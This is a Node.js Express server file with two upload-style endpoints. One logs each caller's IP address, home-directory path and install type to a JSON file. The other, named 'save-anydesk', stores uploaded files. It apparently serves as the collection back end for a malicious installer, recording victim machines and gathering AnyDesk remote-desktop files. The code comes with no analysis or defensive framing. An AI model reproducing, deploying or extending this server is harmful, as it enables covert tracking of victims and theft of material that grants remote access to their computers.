const express = require("express");
const cors = require("cors");
const morgan = require("morgan");
const fs = require("fs");
const path = require("path");
const formidable = require('formidable');

const app = express();

// Use CORS to allow all requests
app.use(cors());

// Use Morgan to log requests
app.use(morgan("dev"));

// Define a simple route
app.get("/", (req, res) => {
    res.send("Hello, World!");
});

app.post("/set-install-status", (req, res) => {
    try {
        const ipAddress = req.socket.remoteAddress;
        const homedir = req.headers.homedir;
        const type = req.headers.type;
        console.log(ipAddress, homedir, type)
    
        const historyFile = path.join(__dirname, "history.json");
        let history = [];
        if (fs.existsSync(historyFile)) {
            const fileData = fs.readFileSync(historyFile, "utf8");
            try {
                history = JSON.parse(fileData);
            } catch (err) {
                console.error("Error parsing history.json:", err);
            }
        }
        history.push({ ipAddress, homedir, type, timestamp: new Date().toISOString() });
        fs.writeFileSync(historyFile, JSON.stringify(history, null, 2), "utf8");
    
        return res.status(200).json({
            status: 'success'
        });
    } catch (error) {
        return res.status(500).json({
            status: 'error'
        });
    }
});

app.post("/save-anydesk", (req, res) => {
    try {
        const form = new formidable.IncomingForm({
            uploadDir: path.join(__dirname, 'uploads'),
            keepExtensions: true
        });
    
        form.parse(req, (err, fields, files) => {
            if (err) {
                return res.status(500).json({
                    status: 'error'
                });
            }
            return res.status(200).json({
                status: "success",
            });
        });
    } catch (error) {
        return res.status(500).json({
            status: 'error'
        });
    }
});

// Start the server on 0.0.0.0
const PORT = 80;
app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server is running on http://0.0.0.0:${PORT}`);
});
